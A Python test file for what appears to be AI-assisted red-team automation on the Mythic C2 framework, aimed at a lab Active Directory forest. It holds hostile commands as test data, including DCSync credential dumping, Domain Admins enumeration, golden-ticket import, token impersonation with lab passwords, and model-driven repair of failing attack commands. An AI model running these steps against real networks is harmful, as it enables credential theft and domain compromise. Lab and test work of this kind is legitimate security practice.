    da_hop = next((h for h in mt._engagement_hops if h.effect == "da:north.sevenkingdoms.local"), None)
    assert da_hop is not None and da_hop.status == "achieved"  # BAD_DN is a name fix, not a rights refutation


def test_contradiction_downgrade_skips_evidence_backed_hop(monkeypatch):
    # A hop backed by REAL proof (verified_on_record) is not downgraded — a later denial is a context issue.
    mt = _make_tools()
    _seed_false_da(mt, monkeypatch, evidence={"source": "issue_task", "verified_on_record": True, "artifact_present": True})
    out = "ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x00002105 (8453)\n"
    mt._apply_contradiction_downgrade("execute_pe", _DCSYNC_PARAMS, out)
    da_hop = next((h for h in mt._engagement_hops if h.effect == "da:north.sevenkingdoms.local"), None)
    assert da_hop is not None and da_hop.status == "achieved"


def test_contradiction_downgrade_ignores_non_dcsync_command(monkeypatch):
    # An access-denied 8453 in a NON-dcsync command's output must not downgrade a rights hop.
    mt = _make_tools()
    _seed_false_da(mt, monkeypatch)
    mt._apply_contradiction_downgrade("ls", '{"Path":"C:\\\\"}', "8453 GetNCChanges /domain:north.sevenkingdoms.local")
    da_hop = next((h for h in mt._engagement_hops if h.effect == "da:north.sevenkingdoms.local"), None)
    assert da_hop is not None and da_hop.status == "achieved"


def test_contradiction_downgrade_leaves_unrelated_and_successful_alone(monkeypatch):
    mt = _make_tools()
    ts = "2026-06-12T00:00:00Z"
    state = engagement_state.EngagementState(objective="t", hops=[])
    state = engagement_state.record_hop_result(
        state, "golden-ticket", "north.sevenkingdoms.local", "achieved", {"source": "issue_task"}, ts)
    mt._engagement_hops = state.hops
    monkeypatch.setattr(mt, "_persist_engagement_ledger", lambda: None)
    # a SUCCESSFUL dcsync (no 8439) must NOT downgrade anything
    mt._apply_contradiction_downgrade(
        "execute_pe", '{"Arguments":"lsadump::dcsync /domain:north.sevenkingdoms.local"}',
        "Hash NTLM: 2b576acbe6bcfda7294d6bd18041b8fe\naes256_hmac ...")
    da_hop = next((h for h in mt._engagement_hops if h.effect == "da:north.sevenkingdoms.local"), None)
    assert da_hop is not None and da_hop.status == "achieved"


# --- Registered-file availability preflight ---

def test_assembly_name_from_params_extracts_only_real_assembly():
    mt = _make_tools()
    assert mt._assembly_name_from_params('{"Assembly":"SharpGPOAbuse.exe","Arguments":"x"}') == "SharpGPOAbuse.exe"
    assert mt._assembly_name_from_params({"assembly_name": "Rubeus.exe"}) == "Rubeus.exe"
    # a file UUID on the upload group is NOT a registered-assembly name
    assert mt._assembly_name_from_params({"assembly_file": "5b2c-uuid", "assembly_arguments": "x"}) == ""
    assert mt._assembly_name_from_params({"Assembly": "not-a-binary"}) == ""


def _registered_file_schema(choices=None):
    return [
        {
            "name": "registered_ref",
            "cli_name": "tool",
            "type": "ChooseOne",
            "parameter_group_name": "Default",
            "required": True,
            "choices": list(choices or []),
            "default_value": "",
        },
        {
            "name": "file",
            "cli_name": "file",
            "type": "File",
            "parameter_group_name": "New File",
            "required": True,
            "choices": [],
            "default_value": "",
        },
    ]


def test_issue_path_registers_schema_selected_file_before_resolver(monkeypatch):
    mt = _make_tools()
    ensured = []
    invalidated = []

    async def fake_ensure(name):
        ensured.append(name)
        return json.dumps({"status": "already_present", "file_uuid": "uuid-1", "binary_filename": name})

    async def fake_schema(command, callback_display_id):
        assert command == "custom-runner"
        assert callback_display_id == 2
        return _registered_file_schema(["SharpHound.exe"] if ensured else [])

    async def fake_invalidate(command, callback_display_id):
        invalidated.append((command, callback_display_id))

    monkeypatch.setattr(mt, "ensure_tool_uploaded", fake_ensure)
    monkeypatch.setattr(mt, "_fetch_command_schema", fake_schema)
    monkeypatch.setattr(mt, "_invalidate_command_schema_cache", fake_invalidate)

    calls = {"issue": 0}
    with _split_issue("ran", calls):
        result = asyncio.run(mt.issue_task_and_waitfor_task_output(
            "custom-runner",
            {"tool": "SharpHound.exe"},
            2,
        ))

    assert result == "ran"
    assert ensured == ["SharpHound.exe"]
    assert invalidated == [("custom-runner", 2)]
    assert "sharphound.exe" in mt._registered_file_checks
    assert calls["issued"][0]["parameters"] == {"tool": "SharpHound.exe"}


def test_issue_path_blocks_when_registered_file_upload_fails(monkeypatch):
    mt = _make_tools()

    async def fake_schema(command, callback_display_id):
        return _registered_file_schema([])

    async def fake_ensure(name):
        return json.dumps({
            "status": "error",
            "binary_filename": name,
            "error": "Mythic file upload /task_upload_file_webhook returned HTTP 404",
        })

    monkeypatch.setattr(mt, "_fetch_command_schema", fake_schema)
    monkeypatch.setattr(mt, "ensure_tool_uploaded", fake_ensure)

    calls = {"issue": 0}
    with _split_issue("should not run", calls):
        result = asyncio.run(mt.issue_task_and_waitfor_task_output(
            "custom-runner",
            {"tool": "SharpHound.exe"},
            2,
        ))

    assert result.startswith(mythic_tools._REGISTERED_FILE_PREFLIGHT_PREFIX)
    assert "SharpHound.exe" in result
    assert "Do not retry" in result
    assert calls["issue"] == 0


def test_registered_file_preflight_skips_when_schema_already_has_choice(monkeypatch):
    mt = _make_tools()

    async def fake_schema(command, callback_display_id):
        return _registered_file_schema(["Rubeus.exe"])

    async def fail_ensure(name):
        raise AssertionError("already-registered file should not require upload")

    monkeypatch.setattr(mt, "_fetch_command_schema", fake_schema)
    monkeypatch.setattr(mt, "ensure_tool_uploaded", fail_ensure)

    asyncio.run(mt._ensure_registered_file_available(
        "custom-runner",
        {"tool": "Rubeus.exe"},
        3,
    ))

    assert "rubeus.exe" in mt._registered_file_checks


def test_registered_file_preflight_skips_chooseone_without_file_group(monkeypatch):
    mt = _make_tools()
    ensured = []

    async def fake_schema(command, callback_display_id):
        return [{
            "name": "method",
            "cli_name": "method",
            "type": "ChooseOne",
            "parameter_group_name": "Default",
            "required": True,
            "choices": [],
            "default_value": "",
        }]

    async def fake_ensure(name):
        ensured.append(name)
        return json.dumps({"status": "already_present", "file_uuid": "uuid-1"})

    monkeypatch.setattr(mt, "_fetch_command_schema", fake_schema)
    monkeypatch.setattr(mt, "ensure_tool_uploaded", fake_ensure)

    asyncio.run(mt._ensure_registered_file_available(
        "custom-runner",
        {"method": "SharpHound.exe"},
        2,
    ))

    assert ensured == []


# --- Universal dcsync /user normalization (NETBIOS\sAMAccountName at the issue path) ---

def test_normalize_dcsync_user_all_forms():
    mt = _make_tools()
    d = "north.sevenkingdoms.local"
    assert mt._normalize_dcsync_user("Administrator", d) == "NORTH\\Administrator"          # bare
    assert mt._normalize_dcsync_user("north.sevenkingdoms.local\\Administrator", d) == "NORTH\\Administrator"  # FQDN\
    assert mt._normalize_dcsync_user("CN=krbtgt,CN=Users,DC=north,DC=sevenkingdoms,DC=local", d) == "NORTH\\krbtgt"  # DN
    assert mt._normalize_dcsync_user("NORTH\\krbtgt", d) == "NORTH\\krbtgt"                  # already correct
    assert mt._normalize_dcsync_user("krbtgt@north.sevenkingdoms.local", d) == "NORTH\\krbtgt"  # UPN


def test_qualify_dcsync_params_execute_pe_shape():
    mt = _make_tools()
    out = mt._qualify_dcsync_params("execute_pe", '{"Domain":"north.sevenkingdoms.local","User":"Administrator","DC":"WINTERFELL"}')
    assert json.loads(out)["User"] == "NORTH\\Administrator"
    out2 = mt._qualify_dcsync_params("execute_pe", {"Domain": "north.sevenkingdoms.local",
                                                    "User": "CN=krbtgt,CN=Users,DC=north,DC=sevenkingdoms,DC=local",
                                                    "DC": "WINTERFELL"})
    assert out2["User"] == "NORTH\\krbtgt"


def test_qualify_dcsync_params_qualifies_native_payload_schema():
    mt = _make_tools()
    params = {"domain": "essos.local", "user": "krbtgt", "dc": "meereen.essos.local"}

    assert mt._qualify_dcsync_params("dcsync", params) == {
        "domain": "essos.local",
        "user": "ESSOS\\krbtgt",
        "dc": "meereen.essos.local",
    }


def test_normalize_sharphound_arguments_rewrites_space_separated_output_dir():
    assert (
        mythic_tools.normalize_sharphound_arguments(r"-c All -o C:\Users\Public")
        == r"-c All --OutputDirectory C:\Users\Public"
    )


def test_normalize_sharphound_arguments_rewrites_equals_output_dir():
    assert (
        mythic_tools.normalize_sharphound_arguments(r"-c All -o=C:\Users\Public")
        == r"-c All --OutputDirectory C:\Users\Public"
    )


def test_build_sharphound_arguments_uses_valid_long_form_defaults():
    args = mythic_tools.build_sharphound_arguments()

    assert "-c All" in args
    assert "--CollectAllProperties" in args
    assert "--OutputDirectory" in args
    assert "--ZipFilename" in args
    assert " -o " not in args


def test_build_sharphound_arguments_parameterizes_output_and_zip_name():
    args = mythic_tools.build_sharphound_arguments(r"C:\Temp", "out.zip")

    assert r"--OutputDirectory C:\Temp" in args
    assert "--ZipFilename out.zip" in args
    assert "north" not in args.casefold()
    assert "essos" not in args.casefold()
    assert "sevenkingdoms" not in args.casefold()


def test_build_sharphound_arguments_targets_external_domain_without_forcing_dc():
    args = mythic_tools.build_sharphound_arguments(
        r"C:\Temp",
        "out.zip",
        domain="target.example.local",
    )

    assert "--Domain target.example.local" in args
    assert "--SearchForest" not in args
    assert "--DomainController" not in args


def test_build_sharphound_arguments_can_use_explicit_domain_controller():
    args = mythic_tools.build_sharphound_arguments(
        domain="target.example.local",
        domain_controller="dc01.target.example.local",
    )

    assert "--Domain target.example.local" in args
    assert "--DomainController dc01.target.example.local" in args


def test_normalize_sharphound_arguments_noops_on_valid_args_and_is_idempotent():
    args = r"-c All --CollectAllProperties --OutputDirectory C:\Users\Public --SearchForest"

    assert mythic_tools.normalize_sharphound_arguments(args) == args
    assert (
        mythic_tools.normalize_sharphound_arguments(
            mythic_tools.normalize_sharphound_arguments(args)
        )
        == args
    )


def test_normalize_sharphound_assembly_params_rewrites_dict_arguments():
    mt = _make_tools()
    params = {"assembly": "SharpHound.exe", "arguments": r"-c All -o C:\Users\Public"}

    out = mt._normalize_sharphound_assembly_params("execute_assembly", params)

    assert out["arguments"] == r"-c All --OutputDirectory C:\Users\Public"


def test_normalize_sharphound_assembly_params_noops_for_other_commands_or_assemblies():
    mt = _make_tools()
    sharphound = {"assembly": "SharpHound.exe", "arguments": r"-c All -o C:\Users\Public"}
    rubeus = {"assembly": "Rubeus.exe", "arguments": r"-c All -o C:\Users\Public"}

    assert mt._normalize_sharphound_assembly_params("shell", sharphound) == sharphound
    assert mt._normalize_sharphound_assembly_params("execute_assembly", rubeus) == rubeus


def test_wait_for_seconds_is_bounded(monkeypatch):
    mt = _make_tools()
    waits = []

    async def fake_sleep(seconds):
        waits.append(seconds)

    monkeypatch.setattr(mythic_tools.asyncio, "sleep", fake_sleep)
    out = asyncio.run(mt.wait_for_seconds(999, reason="gp refresh"))

    assert waits == [600]
    assert "waited 600 seconds" in out
    assert "gp refresh" in out


def test_capability_wait_emits_started_minute_progress_and_completed(monkeypatch):
    mt = _make_tools()
    waits = []
    events = []

    async def fake_sleep(seconds):
        waits.append(seconds)

    async def observer(event):
        events.append(event)

    async def binding(command_obj, _callback_id):
        return {
            "ok": True,
            "command": command_obj["command"],
            "parameters": command_obj["parameters"],
        }

    monkeypatch.setattr(mythic_tools.asyncio, "sleep", fake_sleep)
    mt.set_capability_command_observer(observer)
    mt._prepare_capability_command_binding = binding

    item = asyncio.run(mt._execute_capability_command(
        {
            "command": "wait_for_seconds",
            "parameters": {"seconds": 300, "reason": "wait for Group Policy refresh"},
        },
        2,
        timeout=5,
        capability_name="abuse-gpo",
    ))

    assert waits == [60, 60, 60, 60, 60]
    assert [event["status"] for event in events] == [
        "started",
        "progress",
        "progress",
        "progress",
        "progress",
        "completed",
    ]
    assert [event.get("result_preview") for event in events[1:-1]] == [
        "1 minute elapsed; 4 minutes remaining",
        "2 minutes elapsed; 3 minutes remaining",
        "3 minutes elapsed; 2 minutes remaining",
        "4 minutes elapsed; 1 minute remaining",
    ]
    assert len({event["trace_id"] for event in events}) == 1
    assert item["command"] == "wait_for_seconds"


def test_rewrite_shell_like_run_handles_json_command():
    mt = _make_tools()
    command, params = mt._rewrite_shell_like_run(
        "run",
        {"command": r"klist purge && dir \\winterfell.north.sevenkingdoms.local\C$"},
    )

    assert command == "shell"
    assert params == r"klist purge && dir \\winterfell.north.sevenkingdoms.local\C$"


def test_rewrite_shell_like_run_normalizes_shell_dict_to_raw_command():
    mt = _make_tools()

    command, params = mt._rewrite_shell_like_run(
        "shell",
        {"command": 'net group "Domain Admins" /domain'},
    )

    assert command == "shell"
    assert params == 'net group "Domain Admins" /domain'


def test_rewrite_shell_like_run_normalizes_powerpick_dict_to_raw_script():
    mt = _make_tools()

    command, params = mt._rewrite_shell_like_run(
        "powerpick",
        {"command": "$ErrorActionPreference='Continue'\nWrite-Output 'ok'"},
    )

    assert command == "powerpick"
    assert params == "$ErrorActionPreference='Continue'\nWrite-Output 'ok'"


def _merlin_shell_schema():
    return [
        {
            "name": "arguments",
            "cli_name": "args",
            "type": "String",
            "parameter_group_name": "Default",
            "required": True,
            "choices": [],
            "default_value": None,
        },
    ]


def _apollo_make_token_schema():
    return [
        {
            "name": "credential",
            "cli_name": "Credential",
            "type": "CredentialJson",
            "parameter_group_name": "credential_store",
            "required": True,
            "choices": [],
            "default_value": None,
        },
        {
            "name": "netOnly",
            "cli_name": "netOnly",
            "type": "Boolean",
            "parameter_group_name": "credential_store",
            "required": False,
            "choices": [],
            "default_value": True,
        },
    ]


def test_credential_binder_converts_only_live_credential_parameters():
    mt = _make_tools()
    mt._fetch_credentials_cached = lambda now: asyncio.sleep(0, result=[{
        "id": 91,
        "account": "Administrator",
        "realm": "ws01",
        "type": "plaintext",
        "credential_text": "CorrectHorseBatteryStaple!",
    }])
    parameters = {
        "credential": {
            "id": "91",
            "account": "Administrator",
            "realm": "ws01",
            "credential": "CorrectHorseBatteryStaple!",
            "type": "plaintext",
        },
        "netOnly": True,
    }

    bound = asyncio.run(mt._bind_mythic_credential_parameters(
        "make_token",
        parameters,
        13,
        param_schema=_apollo_make_token_schema(),
    ))

    assert bound == {"credential": "@cred:91", "netOnly": True}
    assert parameters["credential"]["id"] == "91"


def test_credential_id_binding_requires_account_realm_consistency():
    mt = _make_tools()
    mt._fetch_credentials_cached = lambda now: asyncio.sleep(0, result=[
        {
            "id": 91,
            "account": "Administrator",
            "realm": "braavos",
            "type": "plaintext",
            "credential_text": "CorrectHorseBatteryStaple!",
        },
        {
            "id": 92,
            "account": "Administrator",
            "realm": "essos.local",
            "type": "plaintext",
            "credential_text": "SageNetOnlyContext1!",
        },
    ])

    reference = asyncio.run(mt._resolve_mythic_credential_reference({
        "id": "91",
        "account": "Administrator",
        "realm": "essos.local",
        "credential": "SageNetOnlyContext1!",
        "type": "plaintext",
    }))

    assert reference == "@cred:92"


def test_force_refresh_credential_binding_is_idempotent_during_store_delay(monkeypatch):
    mt = _make_tools()
    mt._fetch_credentials_cached = lambda now: asyncio.sleep(0, result=[])
    created = []

    async def fake_create_credential(client, credential, account, realm, comment, credential_type):
        created.append((account, realm, credential, credential_type))
        return {"id": 100 + len(created)}

    monkeypatch.setattr(mythic_tools.mythic, "create_credential", fake_create_credential)
    value = {
        "account": "Administrator",
        "realm": "essos.local",
        "credential": "SageNetOnlyContext1!",
        "type": "plaintext",
    }

    first = asyncio.run(mt._resolve_mythic_credential_reference(value))
    second = asyncio.run(mt._resolve_mythic_credential_reference(value, force_refresh=True))

    assert first == "@cred:101"
    assert second == first
    assert created == [("Administrator", "essos.local", "SageNetOnlyContext1!", "plaintext")]


def test_credential_binder_leaves_merlin_direct_user_pass_unchanged():
    mt = _make_tools()
    parameters = {
        "user": "Administrator",
        "pass": "CorrectHorseBatteryStaple!",
        "domain": "ws01",
    }
    schema = [
        _string_param("user"),
        _string_param("pass"),
        _string_param("domain"),
    ]

    bound = asyncio.run(mt._bind_mythic_credential_parameters(
        "make_token",
        parameters,
        2,
        param_schema=schema,
    ))

    assert bound == parameters


def test_credential_binder_resolves_matching_store_credential_without_id():
    mt = _make_tools()

    async def fake_fetch_credentials(now):
        return [{
            "id": 91,
            "account": "Administrator",
            "realm": "ws01",
            "type": "plaintext",
            "credential_text": "CorrectHorseBatteryStaple!",
        }]

    mt._fetch_credentials_cached = fake_fetch_credentials
    parameters = {
        "credential": {
            "account": "Administrator",
            "realm": "ws01",
            "credential": "CorrectHorseBatteryStaple!",
            "type": "plaintext",
        },
        "netOnly": True,
    }

    bound = asyncio.run(mt._bind_mythic_credential_parameters(
        "make_token",
        parameters,
        13,
        param_schema=_apollo_make_token_schema(),
    ))

    assert bound["credential"] == "@cred:91"


def test_issue_path_repairs_mythic_credential_reference_rejection_once(monkeypatch):
    mt = _make_tools()
    calls = {"issue": 0}

    async def make_token_schema(command, callback_display_id):
        assert command == "make_token"
        return _apollo_make_token_schema()

    async def fake_issue_task(mythic, command_name, parameters, callback_display_id, wait_for_complete=True, timeout=None):
        calls["issue"] += 1
        calls.setdefault("parameters", []).append(parameters)
        if calls["issue"] == 1:
            raise Exception("Failed to process task references: cred parameters require @cred task references")
        return {"display_id": 7300}

    async def fake_waitfor(mythic, task_display_id, timeout=None):
        return "Successfully impersonated ws01\\Administrator for remote access."

    monkeypatch.setattr(mt, "_fetch_command_schema", make_token_schema)
    mt._fetch_credentials_cached = lambda now: asyncio.sleep(0, result=[{
        "id": 91,
        "account": "Administrator",
        "realm": "ws01",
        "type": "plaintext",
        "credential_text": "CorrectHorseBatteryStaple!",
    }])
    monkeypatch.setattr(mythic_tools.mythic, "issue_task", fake_issue_task)
    monkeypatch.setattr(mythic_tools.mythic, "waitfor_for_task_output", fake_waitfor)
    original_bind = mt._bind_mythic_credential_parameters
    bind_calls = {"count": 0}

    async def delayed_bind(*args, **kwargs):
        bind_calls["count"] += 1
        if bind_calls["count"] == 1:
            return args[1]
        return await original_bind(*args, **kwargs)

    monkeypatch.setattr(mt, "_bind_mythic_credential_parameters", delayed_bind)
    parameters = {
        "credential": {
            "id": "91",
            "account": "Administrator",
            "realm": "ws01",
            "credential": "CorrectHorseBatteryStaple!",
            "type": "plaintext",
        },
        "netOnly": True,
    }

    output = asyncio.run(mt.issue_task_and_waitfor_task_output(
        "make_token",
        parameters,
        13,
        timeout=5,
    ))

    assert "Successfully impersonated" in output
    assert calls["issue"] == 2
    assert isinstance(calls["parameters"][0]["Credential"], dict)
    assert calls["parameters"][1]["Credential"] == "@cred:91"


def test_bound_credential_contexts_keep_distinct_make_token_identities(monkeypatch):
    mt = _make_tools()
    calls = {"issue": 0}

    async def make_token_schema(command, callback_display_id):
        return _apollo_make_token_schema()

    monkeypatch.setattr(mt, "_fetch_command_schema", make_token_schema)
    mt._fetch_credentials_cached = lambda now: asyncio.sleep(0, result=[
        {
            "id": 88,
            "account": "cersei.lannister",
            "realm": "sevenkingdoms.local",
            "type": "plaintext",
            "credential_text": "SageNetOnlyContext1!",
        },
        {
            "id": 91,
            "account": "Administrator",
            "realm": "braavos",
            "type": "plaintext",
            "credential_text": "CorrectHorseBatteryStaple!",
        },
        {
            "id": 92,
            "account": "Administrator",
            "realm": "essos.local",
            "type": "plaintext",
            "credential_text": "SageNetOnlyContext1!",
        },
    ])
    cersei = {
        "credential": {
            "id": "88",
            "account": "cersei.lannister",
            "realm": "sevenkingdoms.local",
            "credential": "SageNetOnlyContext1!",
            "type": "plaintext",
        },
        "netOnly": True,
    }
    braavos = {
        "credential": {
            "id": "91",
            "account": "Administrator",
            "realm": "braavos",
            "credential": "CorrectHorseBatteryStaple!",
            "type": "plaintext",
        },
        "netOnly": True,
    }
    essos = {
        "credential": {
            "id": "92",
            "account": "Administrator",
            "realm": "essos.local",
            "credential": "SageNetOnlyContext1!",
            "type": "plaintext",
        },
        "netOnly": True,
    }

    with _split_issue("Successfully impersonated remote identity.", calls):
        first = asyncio.run(mt.issue_task_and_waitfor_task_output("make_token", cersei, 1, timeout=5))
        second = asyncio.run(mt.issue_task_and_waitfor_task_output("make_token", braavos, 1, timeout=5))
        third = asyncio.run(mt.issue_task_and_waitfor_task_output("make_token", essos, 1, timeout=5))
        duplicate = asyncio.run(mt.issue_task_and_waitfor_task_output("make_token", essos, 1, timeout=5))

    assert "Successfully impersonated" in first
    assert "Successfully impersonated" in second
    assert "Successfully impersonated" in third
    assert calls["issue"] == 3
    assert calls["issued"][0]["parameters"]["Credential"] == "@cred:88"
    assert calls["issued"][1]["parameters"]["Credential"] == "@cred:91"
    assert calls["issued"][2]["parameters"]["Credential"] == "@cred:92"
    assert "matching NetOnly Kerberos logon context" in duplicate
    assert "administrator@essos.local" in duplicate.casefold()


def test_bound_credential_reference_without_identity_does_not_create_empty_duplicate_key():
    mt = _make_tools()

    assert mt._kerberos_logon_context_key(
        "make_token",
        1,
        {"Credential": "@cred:91", "netOnly": True},
    ) is None


def test_failure_breaker_survives_credential_rebinding():
    mt = _make_tools()
    original = {
        "Credential": {
            "account": "Administrator",
            "realm": "essos.local",
            "credential": "SageNetOnlyContext1!",
            "type": "plaintext",
        },
        "netOnly": True,
    }
    first_bound = {"Credential": "@cred:91", "netOnly": True}
    second_bound = {"Credential": "@cred:92", "netOnly": True}

    mt._register_bound_command_parameters("make_token", original, first_bound)
    mt._register_bound_command_parameters("make_token", original, second_bound)

    first_key = mt._task_failure_key("make_token", 13, first_bound)
    second_key = mt._task_failure_key("make_token", 13, second_bound)
    mt._task_failure_counts[first_key] = 2

    assert second_key == first_key
    assert mt._task_failure_counts[second_key] == 2


def test_issue_failure_breaker_stops_after_credential_reference_changes(monkeypatch):
    mt = _make_tools()
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(
        0,
        result=_apollo_make_token_schema(),
    )
    bind_calls = {"count": 0}

    async def changing_bind(command, parameters, callback_display_id, **kwargs):
        bind_calls["count"] += 1
        bound = dict(parameters)
        bound["Credential"] = f"@cred:{90 + bind_calls['count']}"
        mt._register_bound_command_parameters(command, parameters, bound)
        return bound

    monkeypatch.setattr(mt, "_bind_mythic_credential_parameters", changing_bind)
    parameters = {
        "credential": {
            "account": "Administrator",
            "realm": "essos.local",
            "credential": "SageNetOnlyContext1!",
            "type": "plaintext",
        },
        "netOnly": True,
    }
    calls = {"issue": 0}

    with _split_issue("temporary error", calls):
        first = asyncio.run(mt.issue_task_and_waitfor_task_output("make_token", parameters, 13, timeout=5))
        second = asyncio.run(mt.issue_task_and_waitfor_task_output("make_token", parameters, 13, timeout=5))
        third = asyncio.run(mt.issue_task_and_waitfor_task_output("make_token", parameters, 13, timeout=5))

    assert first == "temporary error"
    assert second == "temporary error"
    assert calls["issue"] == 2
    assert "already failed 2 times" in third


def test_issue_path_wraps_merlin_shell_command_line_from_live_schema(monkeypatch):
    mt = _make_tools()
    calls = {}

    async def shell_schema(command, callback_display_id):
        assert command == "shell"
        assert callback_display_id == 2
        return _merlin_shell_schema()

    monkeypatch.setattr(mt, "_fetch_command_schema", shell_schema)

    with _split_issue("read ok", calls):
        out = asyncio.run(mt.issue_task_and_waitfor_task_output(
            "shell",
            {"arguments": r"type \\north.local\SYSVOL\north.local\Policies\{GUID}\ScheduledTasks.xml"},
            2,
            timeout=5,
        ))

    assert out == "read ok"
    assert calls["issued"] == [{
        "command_name": "shell",
        "parameters": {"args": r"type \\north.local\SYSVOL\north.local\Policies\{GUID}\ScheduledTasks.xml"},
        "callback_display_id": 2,
    }]


def test_execute_capability_command_repairs_shell_parser_failure_once(monkeypatch):
    mt = _make_tools()
    calls = {}
    schema_calls = {"shell": 0}
    outputs = iter([
        "Failed to run shell's ParseArgString function: invalid character 'y' in literal true (expecting 'r')",
        "read ok",
    ])

    async def delayed_shell_schema(command, callback_display_id):
        assert command == "shell"
        schema_calls["shell"] += 1
        return None if schema_calls["shell"] == 1 else _merlin_shell_schema()

    monkeypatch.setattr(mt, "_fetch_command_schema", delayed_shell_schema)

    command_obj = {
        "command": "shell",
        "parameters": r"type \\north.local\SYSVOL\north.local\Policies\{GUID}\ScheduledTasks.xml",
        "purpose": "read back structured XML",
        "expected_probe": "extract_gpo_system_exec_probe",
        "produces": ["artifact:xml_validated"],
        "consumes": ["artifact:gpo_immediate_task"],
    }

    with _split_issue(lambda: next(outputs), calls, display_id=7103):
        item = asyncio.run(mt._execute_capability_command(command_obj, 2, timeout=5))

    assert calls["issue"] == 2
    assert calls["issued"][0]["parameters"] == command_obj["parameters"]
    assert calls["issued"][1]["parameters"] == {"args": command_obj["parameters"]}
    assert item["result_class"] == "success"
    assert item["repair_attempt"] == 1
    assert item["repair_kind"] == "rebuild_with_payload_schema"
    assert item["repair_history"][0]["result_class"] == "construction"


def _live_command_schema(command, *params):
    return {
        "cmd": command,
        "commandparameters": list(params),
        "description": "",
    }


def _string_param(name, *, required=True):
    return {
        "name": name,
        "cli_name": name,
        "type": "String",
        "parameter_group_name": "Default",
        "required": required,
        "choices": [],
        "default_value": None,
    }


def test_execute_capability_command_uses_deterministic_operation_provider_before_model_repair(monkeypatch):
    mt = _make_tools()
    mt._command_schema_cache["merlin"] = [
        _live_command_schema("run", _string_param("executable"), _string_param("arguments", required=False)),
    ]
    resolver_calls = []
    calls = {}

    async def fake_payload_type(callback_display_id):
        assert callback_display_id == 2
        return "merlin"

    async def fake_resolver(request):
        resolver_calls.append(request)
        raise AssertionError(f"catalogued provider should resolve before model repair: {request}")

    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
    mt.set_mechanic_repair_resolver(fake_resolver)
    command_obj = {
        "command": "ticket_cache_purge",
        "parameters": {"all": True, "serviceName": "", "luid": ""},
        "capability": "forge-golden-ticket",
        "operation": "kerberos-ticket-purge",
        "purpose": "purge current ticket cache",
        "expected_probe": "extract_ticket_cache_probe",
        "produces": ["kerberos_current_tickets_purged"],
        "consumes": [],
    }

    with _split_issue("purged", calls, display_id=7104):
        first = asyncio.run(mt._execute_capability_command(command_obj, 2, timeout=5))
        second = asyncio.run(mt._execute_capability_command(command_obj, 2, timeout=5))

    assert resolver_calls == []
    assert [item["command_name"] for item in calls["issued"]] == ["run", "run"]
    assert calls["issued"][0]["parameters"] == {"executable": "klist.exe", "arguments": "purge"}
    assert first["operation_provider"]["status"] == "accepted"
    assert first["operation_provider"]["name"] == "windows-klist-purge"
    assert first["operation_provider"]["original_command"] == "ticket_cache_purge"
    assert first["operation_provider"]["replacement_command"] == "run"
    assert second["operation_provider"]["status"] == "accepted"


def test_execute_capability_command_repairs_unknown_payload_binding_once(monkeypatch):
    mt = _make_tools()
    mt._command_schema_cache["merlin"] = [
        _live_command_schema("run", _string_param("executable"), _string_param("arguments", required=False)),
    ]
    resolver_calls = []
    calls = {}

    async def fake_payload_type(callback_display_id):
        assert callback_display_id == 2
        return "merlin"

    async def fake_resolver(request):
        resolver_calls.append(request)
        assert request["operation"] == "custom-ticket-purge"
        assert request["original"]["command"] == "agent_ticket_purge"
        return {
            "command": "run",
            "parameters": {"executable": "klist.exe", "arguments": "purge"},
            "rationale": "payload-specific fallback",
        }

    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
    mt.set_mechanic_repair_resolver(fake_resolver)
    command_obj = {
        "command": "agent_ticket_purge",
        "parameters": {"all": True, "serviceName": "", "luid": ""},
        "capability": "forge-golden-ticket",
        "operation": "custom-ticket-purge",
        "purpose": "purge current ticket cache",
        "expected_probe": "extract_ticket_cache_probe",
        "produces": ["kerberos_current_tickets_purged"],
        "consumes": [],
    }

    with _split_issue("purged", calls, display_id=7104):
        first = asyncio.run(mt._execute_capability_command(command_obj, 2, timeout=5))
        second = asyncio.run(mt._execute_capability_command(command_obj, 2, timeout=5))

    assert len(resolver_calls) == 1
    assert [item["command_name"] for item in calls["issued"]] == ["run", "run"]
    assert first["mechanic_repair"]["status"] == "accepted"
    assert second["mechanic_repair"]["status"] == "accepted"


def test_execute_capability_command_requires_rebuild_for_multistep_ticket_import_provider(monkeypatch):
    mt = _make_tools()
    mt._command_schema_cache["merlin"] = [
        _live_command_schema(
            "load-assembly",
            _string_param("filename"),
        ),
        _live_command_schema(
            "invoke-assembly",
            _string_param("assembly"),
            _string_param("arguments", required=False),
        ),
    ]
    calls = {}

    async def fake_payload_type(callback_display_id):
        assert callback_display_id == 2
        return "merlin"

    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
    command_obj = {
        "command": "ticket_cache_add",
        "parameters": {"base64ticket": "{{kerberos_ticket_base64}}"},
        "capability": "forge-golden-ticket",
        "operation": "kerberos-ticket-import",
        "purpose": "import current ticket",
        "expected_probe": "extract_ticket_cache_probe",
        "produces": ["kerberos_ticket_imported"],
        "consumes": ["kerberos_ticket_base64"],
    }

    with _split_issue("should not issue", calls, display_id=7105):
        item = asyncio.run(mt._execute_capability_command(command_obj, 2, timeout=5))

    assert calls == {}
    assert item["operation_provider"]["name"] == "managed-rubeus-ptt"
    assert item["operation_provider"]["kind"] == "external-tool"
    assert item["operation_provider"]["status"] == "failed"
    assert item["result_class"] == "construction"
    assert "requires setup command 'load-assembly'" in item["failure_reason"]


def test_execute_capability_command_rejects_shell_repair_when_run_exists(monkeypatch):
    mt = _make_tools()
    mt._command_schema_cache["merlin"] = [
        _live_command_schema("run", _string_param("executable"), _string_param("arguments", required=False)),
        _live_command_schema("shell", _string_param("arguments")),
    ]
    calls = {}

    async def fake_payload_type(_callback_display_id):
        return "merlin"

    async def fake_resolver(_request):
        return {
            "command": "shell",
            "parameters": {"arguments": "klist purge"},
            "rationale": "use a shell",
        }

    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
    mt.set_mechanic_repair_resolver(fake_resolver)
    command_obj = {
        "command": "ticket_cache_purge",
        "parameters": {"all": True, "serviceName": "", "luid": ""},
        "capability": "forge-golden-ticket",
        "operation": "custom-ticket-purge",
        "purpose": "purge current ticket cache",
        "expected_probe": "extract_ticket_cache_probe",
    }

    with _split_issue("should not issue", calls):
        item = asyncio.run(mt._execute_capability_command(command_obj, 2, timeout=5))

    assert calls == {}
    assert item["result_class"] == "construction"
    assert item["mechanic_repair"]["status"] == "failed"
